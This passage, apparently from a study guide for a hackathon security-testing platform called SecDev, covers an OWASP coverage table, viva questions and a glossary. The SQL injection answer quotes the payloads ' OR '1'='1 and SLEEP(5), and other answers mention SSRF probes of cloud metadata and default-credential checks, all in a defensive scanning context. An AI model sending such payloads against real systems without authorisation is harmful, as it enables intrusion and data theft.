| A03 | Injection | SQL Injection scanner + XSS scanner — sends attack payloads, detects execution |
| A04 | Insecure Design | API tester — checks for unhandled methods, missing validation |
| A05 | Security Misconfiguration | Headers scanner + Rate Limit scanner — missing headers, missing rate limits, info disclosure |
| A06 | Vulnerable Components | (Detected indirectly through header leaks like `X-Powered-By`) |
| A07 | Auth Failures | Auth Bypass scanner — default credentials, broken token validation |
| A08 | Data Integrity Failures | Headers scanner — checks Content-Security-Policy prevents script injection |
| A09 | Logging & Monitoring | Rate Limit scanner — no rate limiting = no monitoring of abuse |
| A10 | SSRF | SSRF scanner — tests internal URL fetching, cloud metadata access |

---

## 19. Viva Questions and Answers

### Q: What is SecDev?
**A:** SecDev is an autonomous security testing platform. Users connect their GitHub repo, and SecDev automatically deploys it in an isolated sandbox, runs 6 security scanners plus functional/performance/browser tests, and generates a scored report with AI-powered fix recommendations — all without any manual configuration.

### Q: How does it address the hackathon problem statement?
**A:** The problem statement asks for "autonomous security solutions that reduce human intervention." SecDev reduces human intervention to zero. The user clicks one button. Everything else — deploying, discovering routes, running attacks, scoring, generating the report — is fully automated.

### Q: How is AI used?
**A:** AI (Groq/Llama 3.1) is used only in the final step. All 6 security scanners are deterministic — they use rule-based detection (pattern matching, status code analysis, timing analysis). The AI's only job is to take the raw scan results and generate a human-readable executive summary, risk assessment, and curl replay commands. This keeps results reliable and costs near zero.

### Q: Why not use AI for the scanning itself?
**A:** Three reasons: (1) Reliability — AI might miss a vulnerability or hallucinate one; rule-based scanning is 100% reproducible. (2) Cost — hundreds of checks per scan would require hundreds of AI calls. (3) Speed — rule-based HTTP checks complete in milliseconds; AI calls take seconds each.

### Q: How do you ensure isolation between users?
**A:** Each deployment runs in its own E2B Firecracker microVM — the same isolation technology that powers AWS Lambda. The sandbox has its own kernel, filesystem, and network. API routes verify sandbox ownership before returning results. Even at the database level, all queries are filtered by user ID.

### Q: How does SQL injection detection work?
**A:** Three detection methods: (1) Send payloads like `' OR '1'='1` and check if SQL error strings appear in the response. (2) If normal input returns 200 but the payload returns 500, the injected SQL crashed an unhandled query. (3) Time-based: send `SLEEP(5)` payload — if the response takes >4 seconds, the SQL was executed on the database.

### Q: What's the difference between SecDev and OWASP ZAP?
**A:** ZAP requires installation, manual configuration, defining scan scope, and interpreting raw results. SecDev is zero-config — connect GitHub, click scan. SecDev also tests in 5 dimensions (security + API + performance + browser + functional), while ZAP only does security. SecDev runs each test in an isolated sandbox; ZAP tests against live servers.

### Q: Why Inngest instead of running everything sequentially?
**A:** If step 5 of 7 fails in a sequential pipeline, you restart from step 1. With Inngest, each step is checkpointed. If step 5 fails, only step 5 retries. This prevents wasting time re-deploying sandboxes and re-running scanners that already completed.

### Q: What is VibeTesting?
**A:** VibeTesting launches a real Chromium browser inside the sandbox using Playwright and runs 4 autonomous agents. They crawl pages, listen for JavaScript console errors, check accessibility (alt text, labels, heading hierarchy), and test responsiveness at both desktop and mobile widths. This catches issues invisible to HTTP-only testing.

### Q: How does route discovery work?
**A:** SecDev scans the app's filesystem structure. For Next.js apps, `app/about/page.tsx` maps to the `/about` route, and `app/api/users/route.ts` maps to the `/api/users` endpoint. This file-based convention means SecDev can find every route by looking at the directory structure — no web crawling or manual URL lists needed.

### Q: What's the scoring formula?
**A:** Score = 100 - (Critical × 15) - (High × 8) - (Medium × 3) - (Low × 1). For example, 2 Critical and 3 Medium findings = 100 - 30 - 9 = 61/100. Each route also gets its own score, and the report shows the worst routes first.

### Q: What if the AI API is down?
**A:** SecDev has a fallback. If the GROQ_API_KEY is not set or the API fails, a deterministic (template-based) analysis is generated instead. The platform works without AI — AI enhances the report but isn't a dependency.

### Q: What database do you use and why?
**A:** Neon PostgreSQL — a serverless Postgres service. PostgreSQL because it's the industry standard for relational data with ACID compliance. Serverless because it scales automatically and we don't need to manage database servers.

### Q: Is the project scalable?
**A:** Yes. E2B sandboxes are stateless and spin up in <1 second — you can run hundreds of scans simultaneously. Inngest handles queueing and rate limiting. Neon PostgreSQL scales automatically. The only bottleneck would be the Groq API, which has rate limits, but since we make only one AI call per scan, this is rarely an issue.

### Q: What OWASP categories does SecDev cover?
**A:** A01 (Broken Access Control) via auth bypass scanner, A03 (Injection) via SQL injection + XSS scanners, A05 (Security Misconfiguration) via headers + rate limit scanners, A10 (SSRF) via SSRF scanner. It also partially covers A02 (Cryptographic Failures), A04 (Insecure Design), A07 (Auth Failures), and A08 (Data Integrity Failures).

### Q: Can this be used for any web framework, not just Next.js?
**A:** The route discovery currently uses Next.js filesystem conventions, but the 6 security scanners work against any HTTP server. Once the app is running in the sandbox at localhost:3000, scanners don't care what framework built it. Route discovery could be extended to support Express, Flask, Django, etc.

---

## 20. Glossary

| Term | Simple Explanation |
|------|-------------------|
| **DAST** | Dynamic Application Security Testing — testing a running app by sending requests |
| **OWASP** | Open Web Application Security Project — nonprofit that defines security standards |
| **Firecracker** | Lightweight VM technology by Amazon, used in AWS Lambda |
| **microVM** | A tiny virtual machine that boots in milliseconds |
| **E2B** | Cloud service that provides instant Firecracker sandboxes |
| **Inngest** | Event-driven workflow engine with durable, retryable steps |
| **JWT** | JSON Web Token — a signed token used for authentication |
| **OAuth** | Protocol that lets you login with GitHub/Google without sharing passwords |
| **XSS** | Cross-Site Scripting — injecting malicious JavaScript into web pages |
| **SQL Injection** | Manipulating database queries through user input |
| **SSRF** | Server-Side Request Forgery — making the server fetch internal URLs |
| **CSP** | Content-Security-Policy — browser header that controls which scripts can run |
| **HSTS** | HTTP Strict Transport Security — forces the browser to use HTTPS |
| **P95** | 95th percentile — the response time that 95% of requests are faster than |
| **Playwright** | Browser automation library by Microsoft (like Selenium but modern) |
| **Rate Limiting** | Restricting how many requests a user can make per time period |
| **Deterministic** | Always produces the same output for the same input (no randomness) |
| **Idempotent** | Running something multiple times produces the same result as running it once |
| **Payload** | The attack string sent to test for vulnerabilities |
| **Reflected XSS** | When user input is echoed back in the page without escaping |
| **Auth Bypass** | Accessing protected resources without proper authentication |
| **Curl** | Command-line tool for making HTTP requests (used to reproduce attacks) |
| **Neon** | Serverless PostgreSQL database service |
| **Groq** | Fast AI inference platform for running open-source LLMs |
| **Llama 3.1** | Meta's open-source language model |

---

*You now have everything needed to confidently explain SecDev from any angle. Refer to specific sections for deeper detail on any topic.*
